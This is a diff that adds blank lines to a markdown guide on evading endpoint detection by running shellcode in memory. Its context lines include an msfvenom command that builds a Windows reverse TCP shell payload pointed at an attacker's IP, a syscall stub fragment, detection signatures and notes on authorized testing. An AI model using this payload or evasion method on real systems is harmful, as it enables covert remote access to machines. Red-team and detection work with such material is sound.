@@ -31,6 +31,7 @@ Modern Endpoint Detection and Response (EDR) solutions have become increasingly 
 ### In-Memory Execution
 
 Traditional malware often writes files to disk, making detection easier for antivirus solutions. In-memory execution avoids this by:
+
 - Allocating executable memory directly
 - Writing shellcode to allocated memory
 - Executing code without touching the disk
@@ -55,6 +56,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f cshar
 ```
 
 This generates C# formatted shellcode for a reverse TCP shell. Key parameters:
+
 - `-p`: Payload type (reverse TCP shell for Windows x64)
 - `LHOST`: Attacker's IP address
 - `LPORT`: Listening port
@@ -272,6 +274,7 @@ byte[] syscallStub = {
 ### Detection Signatures
 
 Common indicators of this technique:
+
 - `VirtualAlloc` with `PAGE_EXECUTE_READWRITE`
 - Thread creation pointing to recently allocated memory
 - High entropy sections (encrypted shellcode)
@@ -290,6 +293,7 @@ Common indicators of this technique:
 ### Testing Environment
 
 Always test in controlled environments:
+
 - Isolated virtual machines
 - Dedicated security labs
 - Authorized penetration testing engagements
@@ -298,6 +302,7 @@ Always test in controlled environments:
 ### Legal Compliance
 
 Ensure compliance with:
+
 - Written authorization from system owners
 - Applicable laws and regulations
 - Organizational security policies
@@ -306,6 +311,7 @@ Ensure compliance with:
 ### Documentation
 
 Maintain detailed records of:
+
 - Testing scope and authorization
 - Techniques used
 - Vulnerabilities discovered
@@ -339,6 +345,7 @@ Maintain detailed records of:
 ### Red Team Perspective
 
 When conducting authorized security assessments:
+
 - Document all activities thoroughly
 - Minimize impact on production systems
 - Report findings responsibly
@@ -347,6 +354,7 @@ When conducting authorized security assessments:
 ### Blue Team Perspective
 
 For defenders implementing controls:
+
 - Focus on detection patterns, not specific tools
 - Implement defense in depth
 - Regular security awareness training
